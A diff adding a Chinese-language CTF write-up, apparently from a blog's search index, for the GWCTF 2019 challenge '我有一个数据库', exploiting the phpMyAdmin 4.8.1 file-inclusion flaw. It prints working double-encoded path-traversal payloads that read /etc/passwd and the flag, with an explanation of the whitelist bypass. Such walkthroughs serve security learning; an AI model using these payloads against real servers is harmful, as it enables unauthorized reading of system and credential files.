@@ -959,4 +959,36 @@
         <tag>网鼎杯</tag>
       </tags>
   </entry>
+  <entry>
+    <title>我有一个数据库</title>
+    <url>/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>首先进去是遗传乱码</p>
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt="1"></p>
+<p>应该是编码问题</p>
+<p>看了一下robots.txt</p>
+<p>里面藏了一个东西</p>
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="1"></p>
+<p>但是里面好像啥也没有</p>
+<p>还是扫描一下把</p>
+<p>可以看到里面有一个phpmyadmin页面</p>
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt="1"></p>
+<p>这里右边直接就给数据库版本服务器版本以及phpadmin版本</p>
+<p>找了半天数据库5.5.62也没啥漏洞，最后看了一下phpmyadmin4.8.1有漏洞</p>
+<p>去网上直接用就行了</p>
+<p>简单来说就是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一个文件包含漏洞</span><br><span class="line">他必须传入target参数</span><br><span class="line">在后面添加?进行截断</span><br><span class="line">’$target=db_sql.php?/../../被包含文件’</span><br><span class="line">就可以读取到文件</span><br><span class="line">但是windows文件不能用特殊字符可以经过两次编码</span><br><span class="line">这样在最后一个判断的时候就可以判断为db_sql.php符合条件就可以文件包含</span><br></pre></td></tr></table></figure>
+
+<p>直接用他们的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../etc/passwd </span><br><span class="line">他会包含这个文件，其中target值会被解析成db_sql.php%3f/../../test.txt，因为php会把前面db_sql.php%3f当成目录</span><br><span class="line">所以要多加一个../来跳出此目录，执行后面语句。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="1"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../flag </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt="1"></p>
+<p>拿到flag</p>
+]]></content>
+      <tags>
+        <tag>GWCTF</tag>
+      </tags>
+  </entry>
 </search>
